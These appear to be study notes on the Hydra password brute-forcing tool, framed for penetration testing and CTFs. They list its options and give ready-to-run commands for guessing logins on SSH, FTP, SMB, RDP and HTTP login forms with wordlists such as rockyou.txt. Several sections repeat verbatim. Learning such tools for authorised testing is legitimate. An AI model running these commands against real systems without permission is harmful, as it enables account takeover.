Hydra

Hydra is Brute force tool used in Penetration testing to test authentication Mechanisms.
Hydra can attempt thousands of username and password combinations against various service.
It automatically tries many passwords or usernames against services like :-
- SSH
- FTP
- HTTP Login page
- SMB
- RDP
- MySQL
- Telnet


Basic Syntax

hydra [options] <service>://<target>
/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
Example Structure:
hydra -l username -P password_list ssh://target_ip
Option
What it means
-l
single username
-P
password list
service://
which service to attack
target_ip
victim machine
-t
number of parallel threads
-V
verbose output
-o
save results to file
-f
stop after first valid login
-s 
specify port
-p
single password

http-post-form?

Because that requires:
```
"/login.php:user=^USER^&pass=^PASS^:F=incorrect"
```




SSH Brute Force

Command:
hydra -l user -P rockyou.txt ssh://target_ip
Example:
Example structure:
```
hydra -l username -P password_list ssh://target_ip
```
This attempts every password in the list for the user jan.


FTP Brute Force

hydra -l admin -P rockyou.txt ftp://target_ip


SMB Brute Force

```
hydra -l admin -P rockyou.txt smb://target_ip
```

HTTP Login Forum Brute Force

```
hydra -l admin -P rockyou.txt target_ip http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"
```
Explanation:
^USER^ -> username placeholder
^PASS^ -> password placeholder
F = -> failure message


RDP Brute Force

```
hydra -l admin -P rockyou.txt rdp://target_ip
```

Using Username Lists

If you have multiple usernames:
```
hydra -L users.txt -P rockyou.txt ssh://target_ip
```

---

Single Password Attack

If testing one password against many users:
```
hydra -L users.txt -p password123 ssh://target_ip
```

---

Increase Speed (Threads)

```
hydra -t 16 -l admin -P rockyou.txt ssh://target_ip
```
-t controls how many parallel attempts Hydra runs.


Save Results to File

```
hydra -l admin -P rockyou.txt ssh://target_ip -o results.txt
```

---

Stop After First Success

```
hydra -l admin -P rockyou.txt ssh://target_ip -f
```
Useful during CTFs.
---

Wordlists

Common wordlist used:
```
/usr/share/wordlists/rockyou.txt
```
If compressed:
gunzip /usr/share/wordlists/rockyou.txt.gz


Increase Speed (Threads)

```
hydra -t 16 -l admin -P rockyou.txt ssh://target_ip
```
-t controls how many parallel attempts Hydra runs.


Save Results to File

```
hydra -l admin -P rockyou.txt ssh://target_ip -o results.txt
```

---

Stop After First Success

```
hydra -l admin -P rockyou.txt ssh://target_ip -f
```
Useful during CTFs.

